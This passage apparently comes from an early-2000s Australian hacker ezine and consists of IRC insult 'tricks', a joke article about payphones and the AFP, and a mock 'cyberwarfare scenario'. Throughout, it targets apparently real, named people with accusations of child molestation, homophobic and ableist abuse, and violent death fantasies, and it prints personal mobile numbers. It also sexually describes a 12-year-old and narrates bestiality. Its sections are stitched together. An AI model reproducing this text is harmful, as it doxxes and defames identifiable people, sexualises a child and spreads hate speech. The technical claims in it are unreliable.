a total iderot and they dun knowe anythink!! try these :

<abuser> like how you keep asking for clarification of things I say
<abuser> it's a sign of a poor mind
<cheeba> are you kidding ?   <--- c how it makes it looke liek it cunt b true ?

nowe say thay hav got past ur frontline tactics, or u dun want 2 keep sayinge
these thingz 4 2 long, wot do u do ? whell if u dun hav a verie gud brain and
comeing up with a cumback is prety much out ov da queshtion u can maik urself
thinke u dun care and infact hav won even tho thay just abused the shyt out
ov u by just by simplie sayeing u r laughing, watch these :

<abuser> so where do you want to get fired from first?
<abuser> your gay flower nursery or your no name accounting firm?
<cheeba> ROFL    <--- haha yeh c nowe u hav preserved ur dignity!!

bai de way, hooever it waz taht mail bombed my flower nursery werk with shyt
like daniel irwin is a pedophile and rang my bhoss upp @ home and tolde them
thay where dead cauz ov serveing pedophile content off there webserver eye amm
keepeing a logg booke of all abuse eye get and will give it 2 da police b4
long!! ROFL (see taht?) okae tahts all. eye hope these were gud?


:: What Anomaly Says.

hmm whell eye dun hav enie advanced techniques liek cheeb, butte thare r 2
thingz u can do if u r stuck. first iz denial, itz liek what cheeb duz :

<abuser> so how many aropax tablets have you taken today?
<anomaly> lol   <--- c howe eye hav my speshial variation!!

second thing iz de MOST IMPRORTANT!! it iz called 'projection'. hear iz a
definition :

Projection :
Denial of one's own unacceptable desires and inadequacies and the perceived
discovery of these desires and inadequacies in other people.

so basicaly wot u do iz if sum1 abuses u, then just remember wot thay said
and @ a later time, use it 2 abuse them!! whott these duz iz make u feel
better bcauz u hav maid it so thay r hyporctical 4 calling u it and nowe u
dun hav 2 suffer them telling u this shyte about urself so bad!! awlso u hav
gott ur revenge on them bcauz thay hurte u with their werds and so u can
thinke u hurt them bakk da same way!! Note that these technique iz 2 b used
without consideration 4 whether it could even possibly b true in your abuser.
PERJECTION ROCKS!!


:: The implementation - By Anomaly's Psychiatrist

Well, you're not an *utter* lamer until you have been replaced by a computer
program, so we had to do that here. I had to step in and write this as well.
You see, anom n cheeb can't actually code. During my psychology training I
seem to have picked up some c skills, so here it is. Like the logs in this
ezine, this code is real, so it will compile and have a conversation with you.
Talking to this program is so similar to talking to anom or cheeb that it is
downright scary. It is *exactly* the same. This program could pass the Turing
test if the fuckers on the other machines that provide the control instances
were anom n cheeb. One last thing, the code is the main part of the fucken
article so read it EVEN IF YOU ARE LAME.

.:::::. [08] Hacking With The AFP ::::::::::::::::::::::::::::. [Rioter]

There has been a rather large increase in the AFP lately mostly to do with the
fact that people think they can get free calls from payphones this was true
due to the fact that a flaw in the refund chute when they were set up i believe
you wouldnt get billed correctly if you stuck a straw up them. This however
like many things was fixed cause of over use now it is very rare to find a
working one because most payphones have now been fixed people from outside the
scene must remember "free calls to Crimestoppers grow on trees" hehe now every
one has an instrest on the free calls side but not to many people know what the
AFP are and how they work well here goes if anythings wrong not my fault blame
my parents, or my 'special' friend Nicholas Klein who forced himself on top of
me at Ruxcon and whose mobile phone costs money to call.

The best way to think of the AFP is a carousel usually at a big circus with
nice pretty horses installed and uses a motion of up-and-down and around and if
the payphone that you tried is out of service the AFP stores it on the server
and if it is stored their for a set period of time it is deleted but if their
is a problem is forwarded to ASIO. hehe the AFP does not always have to send
to ASIO it can be sent to the FBI or can be sent to the CIA some payphones
functions (might want to look for an exploit here) can be sent to the NSA now
the problem with the (high-low) up-and-down and around circular motion of the
AFP is that each layer has a different protocall and the AFP checks what layer
it is going to and if it need to goto a different layer the payphone sends it
to it and then to the other agencies the AFP changes the protocalls and then
stores or forwards the CLI respectavly so it can take some time...

Well due to lack of time I have to been able to go into the detail i would have
liked but i hope that clears any questions you had if you have anymore
questions feel free to email me

.:::::. [09] Electronic Doomsday Scenario (P4K) ::::::::::::::. [Michael Erb.]

:: Pearlharbor 4 Komputers

The true nature of an all-out information warfare attack may never be known.
However, the likelihood of terrorist or rogue information warfare attacks is
very high. This article illustrates how a group of six people from around
Australia might attempt to launch a sustained terrorist information
warfare attack and not disrupt businesses and the government for an extended
period of time. It also shows how national cooperation in information warfare
attacks is not really all that necessary in order to have a reasonable and
swift response to attacks of this nature. Infact, they have some comic
value, sort of like an angry spastic stranded on a busy road's median strip.

While this account is fictionalised, it is based on true events and illustrates
the sort of thing that probably would happen if these people made this attempt.
I had thought of adding a star (*) next to each based-on-fact item, but there
would have been stars all over the place. It has been very difficult for me to
embellish things that actually occurred, so be aware that even if something
seems fictional, something like this probably actually has happened.

:: THE P4K TEAM

Pearlharbor 4 Komputers is an information warfare scenario. It was created by
a group of six people from different parts of Australia. They all had high-
level mental difficulties, low skills and got to know each other over the
internet solely through chat rooms. They all came from similar backgrounds of
divorced parents or atleast families in which the father was demonized and they
are all poorly educated and unintelligent people. They each had their own
reasons for participating - some delusions of political grandeur, some just for
masturbation material, some because they were angry at the people around them;
others were simply alienated or disenfranchised. The individuals in the group
of six are listed below, their backgrounds are as follows :

Code Name : Anal-Anomaly. Male, Born Utah, USA. Age 23 years old. Sole
education includes IRC and attempts at reading slashdot. No qualifications.
Spent four months in a mental institution after running away from home and
is currently on medication to stabilise delusions but hasn't been having
enough contact with his psychiatrist. Has had difficulty holding down a job.
His father molested him as a child, as a teenager and well just recently also.
His parents pay for his living expenses. Openly homosexual, Analomy pines for
Weak-Cheeba, another member of the Pe4rlnecklace team. Yes, he is a Mormon.

Code Name : Weak-Cheeba. Male, Born Queensland, AUS. Age 24 years old. The
only member of the Pe4rlnecklace team to have received education, however this
extends only to basic Linux system administration skills. You would think that
this would make him the leader of the team (and he would too), but in reality
he has the weakest mind and at any rate is Analomy's bitch and although he has
not yet consummated their relationship it is only because he is too scared to
come out of the closet. A closet homosexual, his parents got divorced after his
father abused him one too many times. Morbidly obese, he has difficulty holding
down a job and is currently in part time employment to whomever is inclined to
hire persons who practically have 'abuse victim' tattooed on their forehead.
Naturally he believes these skills will come in handy during this scenario.
We will see.

Code Name : X-tremely-festy. Gender Unknown, Born Adelaide, AUS. Age 20 years
old. Education consists solely of IRC and attempts at understanding mailing
lists. Has also failed the civil service exam multiple times. The rest of the
Pe4rlnecklace team excluding his lover Denied secretly hate him although he
is the only one of the team that deep down realises he is socially destitute
and has spent a fair amount of time crying about this dilemma. He has never
been married, is a closet homosexual, this only because he is not primarily
attracted to *HUMAN* males and has a reputation for promiscuity (with
livestock). Adopted the monifer Xfesty when he decided that the objective
name other people had given him, 'Festy' was now no longer appropriate.
xfesty also has narcissistic and other assorted mental difficulties. As
expected, his parents are divorced after his father abused him one too many
times.

Code Name : Brain-Denied. Male. Born Sydney, AUS. Age 20 years old. Education
consists mostly of taking his head and beating it against large objects, like
for example, walls, bedposts, computers. The person who molested him as a boy
was not actually his real father and was instead a gay man who his mother found
financially viable to shack up with for a while. He was in actual fact
artificially inseminated. His "parents" are divorced and his "father" is now
living in an openly homosexual relationship in Sydney. He was kicked out of
TAFE for rooting the leg of a staff member, is not employed and is a social
recluse apart from the fact that he is in a closet quasi-homosexual
relationship with fellow Pe4rlnecklace member xfesty. 'quasi' because they are
both so sexually disfunctional that no current classification is really
adequate.

Code Name : Personality-Crisis. Male. Born Adelaide, AUS. Age 20. The faithful
abused lapdog of the team. It is unknown whether the pattern of father
performed molestation exists here, although the peer performed molestation
circumstances certainly take its place. Also known as the "Linuxphreaks Screen
Monkey" and known for his inability to use even the simplest computer
applications (ie. screen) he assumes one of the roles of lowest respect on the
team. Plainly under the nose of Cheeba (although still unbeknownst to him) he
has been pursuing a homosexual relationship with Analomy who forces himself
upon him on a fairly regular basis. His sole education involves being
indocrinated as the gimp of the Pe4rlnecklace team and can be considered unable
to perform even basic actions without intense supervision.

Code Name : Gremlame. Male. Born Sydney, AUS. Age 12. Far ahead of his years in
terms of the subject of homosexuality, but with little or no understanding of
anything else he went from being his father's little prostitute to selling
himself for slowly elevating operator status on the Pe4rlnecklace team's IRC
server while remaining his father's little prostitute. The only member of the
team to have suffered continuing molestation at not only the hands of his
father, but also his uncles (both sides), grandfathers and also cousins,
schoolteachers etc. The only member Cheeba has actually had the balls to come
out of his closet and have homosexual intercourse with.

:: THE CONCEPTION OF P4K

These people rarely meet in person for any other reason than fudgepacking
purposes, infact that is rarely all they meet online for as well. They were
familiar with each other's handle or code name, because they came together in
IRC chat rooms. None of them are really full-fledged members of any computer
underground or hacking organisation and infact are the subject of much ridicule
should they even attempt to join. They developed a relationship because they
came together in a chat room where there was a thinly veiled undertone of
homoeroticism.

:: DAY 1 : THE LAUNCH OF P4K

About 12.00pm, December 3, 2003, Wednesday morning in Capital cities around
Australia police phone operators started receiving call upon call of what at
first may have seemed like a lead, but as repeated calls came in, with several
variants, were labelled as hoax calls from crackpot callers. The calls
contained many inconsistencies and included information that was in many cases
blatantly false. Several variants were coming in at the same time. All the
variants were aimed at the well known Crimestoppers service.

Variant number one had an initial claim of "I AM A MASTER HAXER AND HAVE A LIST
OF ALL HAXERS IN AUSTRALIA!!". This went on to give names of celebrities as the
real names of people known to the team. Additional information was supplied on
crimes committed by these people, but much of the information was incorrect and
resulted in the entire call being discounted.

Variant number two had a claim of "ALERT MR POLICEMAN. A WEBSITE ON THE
INTERNET IS DISTRIBUTING ILLEGAL MATERIAL!!". This went on to give urls for
either websites that had been shut down as soon as the operators knew the p4k
team knew about them, or that consisted of massive amounts of chaff and
consisting of mostly harmless content anyway.

Variant number three had a claim of "HELP ME I AM BEING STALKED BY PEOPLE WHO
DON'T LIKE ME GIVING YOU INFO!!". This variant went on to give names of movie
stars and variations thereupon as names of the people that the team thought
might be harassing them.

It took less than four hours for the Crimestoppers staff to just unplug their
phones and go out for donuts rather than deal with the large amounts of noise
that was wasting all their time on that day.

The Pe4rlnecklace team had effectively made their first strike. Believing that
the police would race into action just to satisfy their whims the p4k team went
to sleep with happiness. Things at crimestoppers didn't start picking up until
roughly two hours later and the operators were treating further calls with
suspicion.

:: DAY 2 : DEMENTIA ON THE WIRES

At about 4.00am, December 4, 2003, Thursday morning, in Australia.
Crimestoppers operators had begun receiving legitimate calls once again not
having to deal with nerds ringing with silly complaints and claims. When the
p4k team noticed that all the perfectly good police officers manning the
phones were not out in a frenzy following up the leads they were given a new
attack was mounted. New phone calls were placed. When a call had finished,
each member picked up and rang crimestoppers once again. The service was
shut down within a single hour this time and the team ended their second
wave of attacks with the assured belief that the police would now certainly
act upon their complaints.

Meanwhile, in reality, the crimestoppers operators sent someone out to maccas
to get them all food while they had a meeting. The previous day's events had
spurred the call centre to adopt a partial CLID collection for the next few
days. Unbeknowst to the p4k team a connection to Adelaide and Queensland had
been made. Calls from these areas were temporarily blocked and the lines were
back up within two hours of the last fruitcake call.

:: DAY 3 : CHAOS UNREALISED

Friday, December 5, 2003. Day 3 began with the p4k team discovering an
outgoing recorded message whenever they attempt to ring crimestoppers along
the lines of "If you are one of the lonely, attention-starved nerds that keep
ringing us : We are not your mummy and daddy. We don't want to hear your
stupid problems and can you please get a life? Your call will not be routed to
crimestoppers, please call your local police station if your call is urgent."
Each coming to the conclusion that this recorded message doesn't apply to
them, the members offer a silent curse to "attention-starved nerds" and
promptly launch a new wave of calls to their local police stations. Soon they
are receiving similar outgoing messages on those lines as well as some police
officers simply refuse to even bother fielding calls at all. Weak-Cheeba hears
about the "damn nerds crank calling police lines" on the radio and is very
angry at such people for tying up lines he wants to use.

Meanwhile, the presence of calls to only certain local police stations has
narrowed the search to a matter of a few suburbs.

:: DAY 4 : A DOWN SYNDROME CONNECTION?

2.00pm, Saturday, December 6, 2003.

After Analomy complaining to his mother about the incompetence of the police
force and letting a few too many things slip Analomy's father gets wind that
his duffer son might be up to no good. Wanting to see Analomy in jail (and not,
I might add, without good reason) he visits the local police station and tells
them he might know someone that has something to do with the calls. Both
Analomy's father and a local police officer attempt to ring Analomy's house
but the phone is engaged for some reason.

During this day the p4k members have met up on IRC and as each member joins
they add an increment to the number on the end of ominous message they are
typing over and over again ROFL1, ROFL2, ROFL3 ... This meant they were all
in sync and prepared to move ahead with their attacks. The next phase was a
free-for-all where the six would split into groups or act individually to
launch more chaos. This was also a game. It was a contest to see which of the
six could be the cleverest(stupidest) in their destructive techniques.

:: DAY 5 : YOU BAA-STARDS

1.45am, Sunday, December 7, 2003.

Xfesty and Denied have paired off for their part in the next wave of attacks.
Their intent is to pollute the gene pool of the local sheep population by
committing a world record in mass-bestiality. You might now be asking what
exactly this has to do with information warfare or perhaps how they think they
are going to do that considering the deviation between chromosome counts in
humans and sheep, but try telling them that. I mean, let's face it, they're
gonna do it anyway so there's no point right? They have a field picked out in
advance and make their way there. The field is home to > 200 sheep that are
going to be sold to other farmers. They feel that they will need perhaps all
night and may be tied up all day tommorrow as well. We'll leave them as they
begin.

:: DAY 6 : SURVIVING WITH AROPAX

11.00am, Monday, December 8, 2003.

Analomy is having problems. During a short break from his phase 2 plans of
continuing his phase 1 narcing plans he has received a distressing phone
call along the lines of this :

"Hello Weasly?"
"Yes"
"This is Sergeant McDonald from Salisbury police station, I'm investigating
some nuisance phone calls to crimestoppers and local police stations. Have
you made any calls to these places recently?"
"Well they are supposed to be anonymous, but I have made some calls, yes."
"How many in the last two days?"
"About a thousand I think .. what is this about officer?"
"OK, I'm going to have to ask you to not leave the house I'll be coming over
shortly."
"Ummm uh umm, did I say a thousand? I mean't I didn't make any!"
"<click>"

Concerned, Analomy rings his lover Crisis and asks what he should do. He
doesn't want to get caught so early in the attack and he wishes he didn't just
accidentally confess over the phone. He asks Crisis whether he should just
tell himself it didn't happen. Crisis insists that he hide out at his place
until the trouble blows over, that way he can continue the attacks and they
can also blow each other in the meantime. Analomy agrees to this course of
action, packs his Ciprimol and Aropax and swiftly exits. Well, he trips on the
stairs and runs kind of bow-legged and like a girl, but swiftly for him anyway.

In the sheep paddock, xfesty and denied are not actually finished as they
projected. They've decided they'll need another day so we'll check back on
them tommorrow.

:: DAY 7 : WEAK-CHEEBA STRIKES

10.30pm, Tuesday, December 9, 2003.

Armed with his Linux For Dummies book, Cheeba has decided upon a course of
action he has planned for months. He attempts to set up cron jobs on his
computer to execute an IRC script he downloaded to send messages to
internet chatrooms over and over again. Running into a problem - he can't
do it - he resorts to manually executing his script again and again. The
message is ominous and one that is quite poetic to cheeba, it consists of a
single word : 'ROFL'. Slowly each chatroom is forced to remove him and ban
his host from joining ever again and Cheeba is assured that he is dealing them
deadly blows with each banning. Of course, certain lame messages and emails
come in telling cheeba to do things like "go fuck himself", he adds each
sender to a list he will be using in his next attack. One message has made
him particularly livid, causing him to scream wildly and incoherently for a
few hours before he goes to sleep and then even during his night's sleep. It
said simply "Laughter is a sign of weakness". He plans to take out his revenge
on this sender with his full capability with his next attack.

Denied and Xfesty's sheep related attacks have not gone unnoticed today. The
shepherd has noticed strange goings on and has gone into the sheep paddock to
investigate. Faced with a horrifying scene the shepherd sets upon denied and
xfesty with a pitchfork. Unable to defend themselves xfesty is speared in the
back in mid ewe chase and is killed. Denied uses the diversion to make a
desperate run for it, the pitchfork wielding shepherd hot on his heels.
Naturally the shepherd catches up to him at the fence line and captures him,
taking him to the farmhouse and phones the authorities who promise to send out
some psychiatric staff to deal with the problem. Cornered, Denied offers sexual
favours to the shepherd in return for his release. Overcome by horror, the
shepherd douses denied in petrol and sets him alight. Not having fully
recovered from shock he has not set the fire safely and burns down his
farmhouse with both his prisoner and himself inside. Xfesty and Denied are out
of the game.

:: DAY 8 : ANALOMY AND CRISIS TEAM UP

9.00pm, Wednesday, December 10, 2003.

Analomy and Crisis have secreted themselves in Crisis' backyard treehouse.
Having made several attempts at running an extension cord to their location
but not being able to figure out how to do it they take a break, only to
notice that Analomy's "paedophile magnet" problem has kicked in and a burly
man is standing on the other side of the fence where they can see him, and
he them, and is exposing himself. Becoming scared they decamp the treehouse
for the house proper. On the way Analomy stops off in the toilet to engage
in a habit he has. On the wall he writes "Analomy : fuck me up the arse you
big baby!" It's a trick he developed in high school to gain respect. Trouble
is, there are only a limited number of people in the house at the current
moment in time and it's not hard to figure out who wrote it. Its only a
matter of time before Crisis' mother notices the defacement of her lavatory
and calls Analomy's dad.

"Hello William, your idiot son is here graffiting my bathroom."
"Ah yes, I will be right over."

Uh-oh.

Crisis is in the process of attempting to explain to Analomy for not the first
time that he is under 21 and what Analomy is doing, no matter Crisis's opinion
on the matter, is statutory rape and could Analomy please stop when the door
is flung open. Analomy's father rushes through the door at high speed in an
intense rage. Seeing him Analomy begins his usual claptrap "You little bitch
son fucker I've been waiting to f..AaaahAAAIIIIIEEEEEE". His father has
overpowered him and is dragging him by the hair out the back door and towards
the bushes. Crisis attempts to intervene with multiple ineffective girl slaps
but is also quickly overpowered, Analomy's father's spare hand firmly gripping
his hair and dragging him to Analomy and his mutual fate.

Crisis and Analomy are incapacitated and out of the game.

:: DAY 9 : GREMLAME'S RUN

10.30am, Thursday, December 11, 2003.

A few thousand kilometres away in Sydney, Gremlame sits at his computer at his
high school. Having been unable to participate in the strike since the weekend,
due to the fact his remedial computer class is on a Thursday and as such he
hasn't had access to a computer, he is eager to begin. For Gremlame's phase 2
attack he plans to own his high school's computer network. He begins by brute
forcing his keyboard - into his mouth. He then begins social engineering his
computer with girlish screams and drooling madly all over himself. In order
to avert the obvious impending disaster Gremlame is about to cause he is
tackled from behind by his schoolteacher. He is not out of the game yet.

Faced once again by the school councillor, a new tactic is used.

"Gremlame, remember when I told you you had potential?"
"YES!!@# EYE HAV TEH POTENSHAL!!"
"Well, we tell all the dumb kids that so they'll try harder."
"YES!!@# EYE HAV TEH POTENSHAL!!"
"No.. thats just the point, you don't. So we tell you you do to give you a
false sense of self-esteem and make you behave yourself. You'll probably
fail even if you try hard, but a chance, no matter how small, is better than
just failing like you are now nu?"
"..."
"Well, we thought that it was time to tell you the truth. All the other
retards figured out we were lying ages ago."

BAD MOVE COUNCILLOR!!

Gremlame's mind is now (completely) broken. Its not long before he is running
naked down the street propositioning anyone he can find with blowjobs. That's
another one out of the game.

:: DAY 10 : WEAK-CHEEBA'S FRENZY

2.00pm, Friday, December 12, 2003.

Two days have passed since Weak-Cheeba's last attack. He has wisely spent this
time tearing out his hair, eating fat laden foods and occasionally screaming
at himself in the mirror. Today he has finally calmed down enough to take out
his terrible vengeance on those that ridiculed him on day 7. He will perform
his most devastating attack ever, a 000 narcing! He places the call with
trembling hands "er hello? i know a criminal, his name is James Bond!" He hangs
up and emits a heavy gasp.

Meanwhile, a police car has been dispatched to Weak-Cheeba's residence. People
have been jamming up Crimestoppers with calls about James Bond for days and
they now have a perpetrator. Weak-Cheeba is standing infront of the mirror in
his batman costume when the police burst through his front door. Puffing, he
makes it to his back door and out into his back garden. Against the fence he
has positioned a set of wooden stairs for him to make his escape over his
fence. Pursued and frantic with the police in tow, Weak-Cheeba waddles as fast
as his fat arse can carry him up the steps to make his escape. However, by the
time he has reached the top he is out of breath and he tumbles over the other
side spinning out of control as he hits the ground. The police give chase as
Weak-Cheeba rolls down the street, unable to get to his feet or stop his
momentum. At the corner of the road, a second patrol car, a K9 unit, is making
the turn when Weak-Cheeba comes hurtling from the other direction and it
strikes him, knocking him like a beach ball into a ditch at the side of the
road. The driver releases his German Shepherd from the back of the patrol car
to secure the capture of the perp and follows.

In the ditch, Weak-Cheeba has landed face down and is struggling to get up. He
has begun rocking himself from side to side when he is assaulted from behind by
the incensed German Shepherd. He begins to scream. By the time the three
pursuing police officers reach the scene, Weak-Cheeba's batman costume is torn
beyond repair, the German Shepherd looks like it could do with a cigarette and
Weak-Cheeba is dead.

:: DAY 11 : MERRY CHRISTMAS

12.00am, Saturday, December 13, 2003.

Well, its not Christmas, but the scenario in my information warfare book (its
shit don't buy it, even for $10) started on December 3 and ended on Christmas
day. Without exception, all the Pe4rlnecklace team are captured,
incapacitated or dead. The total cost of these attacks was approximately
$10.50, thats $10.00 for a pack of donuts and 50c for a cigarette for the
police dog.

This cyberwarfare scenario is set out the same way as the one in my book,
Information Warfare : How To Survive Cyber Attacks.

:: Trick 2 : Outsmart Ur Foez Wid Wile N Guile

okae. herez 1 from my famus Austnet IRC *WAR* (I cawled it taht) eye waz in and
left cauz ov all dis lamnez. sum fqr haz registered rioter's nickname and was
mocking him about it infrunt ov me. BAD MOVE SUCKAR!!

<cheeba> why take rioter's nick?
<rioter> to annoy him
<cheeba> want my nick ?!
<rioter> yes
* cheeba is now known as cheeeba
<cheeeba> go on then take it
<cheeeba> see if I care
* rioter is now known as cheeba
<cheeba> hah
<cheeeba> having fun ?
<cheeba> I just regged cheeba
<cheeba> if you try to use it now I will kill you
* cheeba is now known as rioter
<cheeeba> you cant /kill your not an ircop
<cheeeba> oh
<rioter> hahahaha

OK. C how eye outsmarted that rioter .. impersonater fqr and showede who waz
boss?! Just so u knowe sum ov tha next few logz may seem liek itz me abuseing
me cauz they was doing it wit my nick cheeba and eye had to put my nick as
killallhippies or simplie cheeeba. C tha 3 e's. fuk eye am so smarte
sometimez :) In de followeing logz eye maye hav to put dis impersonater as
<lecturer> instead of just <cheeba> to avoide confussion.


:: Trick 3 : Get Urself Known 4 Having Been Abused By Ur Father

Riteo. dis 1 is important. u hav ur eleat name and while u can outsmart ur foez
only *u* know dis so nowe u need an eleat rep 2 go wid it. best waye 2 do dis
iz again 2 hav a spak @ some1 giveing u shit about somethin :

<lecturer> dan's dad is a hell pedo rioter
<lecturer> ask him some other time
<lecturer> when he's not watching out for it
<lecturer> and he'll tell you
<lecturer> he'll complain about how he's "sick of his dad"
<killallhippies> lecturer:
<killallhippies> just so u know
<killallhippies> and this is a promise
<killallhippies> you will go down for this bullshit
<killallhippies> got that ?

dis fqr maye hav just bin giveing me shit about my dad arsefucking me cause of
anomaly's (my m8) dad arsefucking *him*, and also becauz some fqr rang up my
dad and called him a pussy some night @ about 2.00am (fqrz), but as u can c eye
acted jus as eye woulde if i *DID* get arsefucked and so nowe eye hav my eleat
rep y0y0y0y0.

beste way 2 continyoo frome hear iz 2 reinforce dis rep u have built up while
talkeing 2 some1 else by makeing additional factz knowne about ur getting
abused. chek dis out :

<lecturer> peter john irwin pimped him xf
<lecturer> I'm serious
<killallhippies> i really am flattere dby dad has a fan club onirc
<killallhippies> my*
<killallhippies> he really is a smart dude
<lecturer> sure is
<lecturer> he never got caught

nowe display ur mad verbal skillz whenever some1 tellz u taht u hav liek
sexual related problemz just 2 *furthar* reinforce ur rep :

<lecturer> would you be somewhere more elite?
<killallhippies> yeah
<killallhippies> like bed
<lecturer> hahha
<lecturer> what like wanking in bed?
<killallhippies> thats what normal ppl do at 2:24am
<killallhippies> heh, its always somtehing sexual
<lecturer> thats because we're talking about you
<lecturer> deviant
<killallhippies> err
<killallhippies> whatever
<lecturer> hahaha


:: Trick 4 : Make Ur Friends Look Like Pussies And Urself Look Stupid

whell eye hav 2 admit, thiz 1 was when eye was haveing abit of a luv tiff
wit xfesty, but nowe he haz cum around and is bak under me at irc.mutox.org,
but it always payes 2 fuk ur bum buddiez over and make urself look petty and
masochistic @ tha same tiem yo :

<killallhippies> xf why were you silent when this piece oif shit was saying
stuff about your mother earlier ???

all helps tha el8 rep u hav 2 build up yea.


:: Trick 5 : Threaten 2 Narc, Then Give Away Ur AFP Agent's Name And Number

enuff aboute *just* me 4 now. letz hav a look @ some k-radikal stuff my m8,
whell he'z abit ov a mfqr, but i owne his arse on my IRC castle, rioter can do.
hears me and him showeing this other fqr whose boss. nowe something u need 2
hav a rep 4 is narcing. az u will c rioter_ (he can't use his real nick cauz we
r still in my austnet war where we both had our nicks stolen) makes someone
phear by threatening to narc on them, thus showeing what narcs we are. the
eleat trick hear iz 2 actually then try 2 trick ur adversary and inadvertently
giv out ur fed's name and number!!!! tricky butte affective :

<killallhippies> why dont u tel us who you really are :)
<userbeer> why so you can narc on me?
<killallhippies> narc ROFL
<killallhippies> userbeer: tell us

  [  c howe wen 1 thing doesnt werk, de beste tactic is 2 just do da same
     thinge again ;)  ]

<userbeer> you love to narc
<rioter_> heh i actually have a feds number if you want me to call it ;)

  [  and who iz tha fed ? letz chuck it in2 conversation l8r  ]

<rioter_> killallhippies real name is nicholas klein
                                      ~~~~~~~~~~~~~~

  [  and will we giv out his number also ????  more tiem passes ...  ]

<rioter_> userbeer: 0407 614 143 ring that number have a talk to me k
                    ~~~~~~~~~~~~

BAM! check taht! ud hav 2 be a moron 2 not wonder if we r narcs now yea!!!
oh jeah, umm nobodie ring nicholas klein teh AFP agent on 0407 614 143.
(Incidentally rioter's real phone number is 0422 154 165...)


:: Trick 6 : Act Like The Cops Are Cool And They Treat U Special

remember the important trick of geting a rep for being a narc. altho eye am
supierer in every way, rioter is a specialist @ this and can make peple believe
the feds r practically knocking downe there dore!!

<rioter_> userbeer umm you do know that prank calls are illegal
<rioter_> and if they are threatening
<rioter_> you can serve time
<userbeer> rioter_ : do you know that there is nothing you can do about it?

don't knowe whot userbeer meant @ da end their, but eye have found taht if u
simplie think some things never happened then they might as well not have!!!
a free trick their!!


:: Trick 3 Recap : Quick Recap Of Trick 3

rite now, u must b thinking woa dis rioter is eleat, almost az eleat az u!
whell not quite, butte much can b learnt from his usage ov my methods, like
how he accomplished my trick 3 method of getting a rep for being abused by
your father. he did these by a "subtle" mistaik :

<rioter> unlike mine your dad doesnt rape you
<rioter> blah
<rioter> *unlike yours
<manuto> sorry rioter
<manuto> freudian slips count


:: Another Trick 3 Recap : Recap Of Trick 3 Again!

ok enuff ov taht fqr rioter, eye hav another bum buddy hear called gremlin, hez
abit of a fqr too and mebe a poof. whell eye arsefucked dis little bitch last
easter yo. anyway, he does this basicly da same way eye do. jus wait till some1
abuses u, then act like itz true :

<Gremlin> [19:32:22] -tarman- you 16 yr old whore that sucks your dad off
<Gremlin> ?
<Gremlin> do i know you tarman?

rofl yea sounds like it does hay gremlin!! great execution! now his eleat rep
is rockin yo!

a patterne somewaht emerges here. sum pepl think theres a correlation with this
and us beinge narcs!! ROFL!! tahts just waht we want them 2 think. WE WIN!!


:: Mix Of Tricks : Mix Tricks 3, 5 & 6.

dis iz staright forward reallie, jus mix em together to sow the seeds of phear
in your foes :

<userbeer> his dad's a pedo
<killallhippies> nice
<killallhippies> ok well
<killallhippies> thats just slander :)


:: Trick 7 : Regularly Display Ur Mad Verbal Skills

alrite u proably hav seen so far taht eye am de master ov the IRC environment
and make peple cry even with my words. hear u can see a classic example of me
abuseing some1. eye especially had to add these log cause it includes this fqr
called marlinspike in it who makes me SO ANGRY. JUST SEEING THIS LOG AGAIN WILL
MAKE ME HAV A HERNIA PROABLY!!!! FQR!!! all de people that mock me are either
him or somehow connected to him in a conspiracy well this is my belief anyway :

[21:10:04] <killallhippies> hey this isnt about anomaly
[21:10:09] <killallhippies> this is about marlinspike being a lame fuq
[21:10:13] <marlin> awwwww
[21:10:17] <killallhippies> so stfu marlinspike youi lame fuq
[21:10:27] <marlin> you have the best insults cheeba
[21:10:34] <killallhippies> whatever
[21:10:35] <marlin> they hurt people!
[21:10:40] <marlin> your barbed tongue!
[21:10:42] <killallhippies> they must
[21:11:11] <marlin> whys that?

  [  dis question is *VERY BAD* if possible u must avoid beinge asked this
     question it can slip you up!! actually it is cheating if some1 asks u
     this. fqrz.  ]

[21:11:23] <killallhippies> err
[21:11:26] <killallhippies> your tellin the story pal
[21:11:33] <marlin> well then they don't
[21:11:41] <killallhippies> ok whatever

by nowe astute peple whill hav noticed taht frome these and from da last log
ov trick 3 that saying 'whatever' is a great way to abuse peple and make you
win almost better than things liek 'stfu' or 'fuck u' ueah!!


:: Trick 8 : Keep Ur Channel Key Secure By Using It As Ur Nickname

nowe if u arent as eleat as me and hav to use a channel on sum public server
like Austnet you can't k-line peple (damn!), but u can kick peple and u can
mak sure no unsavories get on ur channel by giving it a key. Now the trick
hear is to be liek my sheep fucker bum buddy denied and change your nick
to cancer, wich in his caise waz also de key 2 a channel he waz involved
with :

> /join #phreak cancer

[13:42:48]  You have joined channel #phreak

[13:43:23] <marlin> hey stacey

okae no worriez u can thank me 4 thiz security tipp l8r.


:: Trick 9 : Display Ur Eleat Hax0r Skillz

these trick is laste becauz its the lest important. butte it still can cum
downe 2 this if u r dealing with sum peple (lamrz). so hear, check thiz. in
dis log taht actually got leaked, u can c me giving a tut on the buffer
overflows and how crap c is :

<sangoma>  strcpy(c,name); <<- isnt that bad coding!?
* cheeba shrugs
<cheeba> C + strings = bad coding
<cheeba> lol
<cheeba> if it wernt for C and strings
<sangoma> lol
<cheeba> no buffer overflows would exist
<sangoma> hehe..

hehehe yea as u can cee - c is FUKCED compared to tings liek java. not shure

.:::::. [12] An Amusing Usenet Incident ::::::::::::::::::::::. [jaiden]

Hellow, Jaiden here. I know I'm not old enough to use the internet yet, but
when I am I will look up Danny boy who frequently touches me inappropriately.
What will I find?

  [ This usenet post caused Cheeba to have a massive tantrum on his website,
    where he used to have a nice diary documenting people abusing him. People
    actually competed to try to get shit they did to him onto that page. Not
    sure this was what he had in mind. I think he hoped that by attempting to
    'expose' his abusers they would stop (or something. Despite his putting
    random names of people he thought might be involved there, he wasn't getting
    the right ones anyway). Out of all the things that pissed him off, ie.
    massive amounts of abuse, his mum and dad being rung up and abused etc.
    getting people to go to his IRC server is what made him break down and jump
    around like an organ grinder's monkey. Facked up if you ask me. ]

From: cheebakourier@yahoo.com (Daniel Irwin)	[ impostor ]
Newsgroups: alt.2600
Subject: Exploits : Better than hack.co.za

Hey guys,

My associates and I have started a new way of archiving exploits for
this community. We are using a private IRC server with FSERVE bots serving
the exploits. In this way we can alleviate ourselves of the burden of needing to
conform to copyright laws and having websites shut down. We currently
have an IRC server set up at :

/server 210.49.137.219

or

/server c17106.carlnfd1.nsw.optusnet.com.au

/join #p4k

and type :

!0day

  [ This was obviously inspired by Cheeba's witticisms in article [6] which
    had been doing the rounds. The thought of people going onto his beloved
    server and repeating something he doesn't understand amuses me for one. ]

for searching and listing commands. We currently have over 1000
exploits and because we are not restricted by copyright laws we have
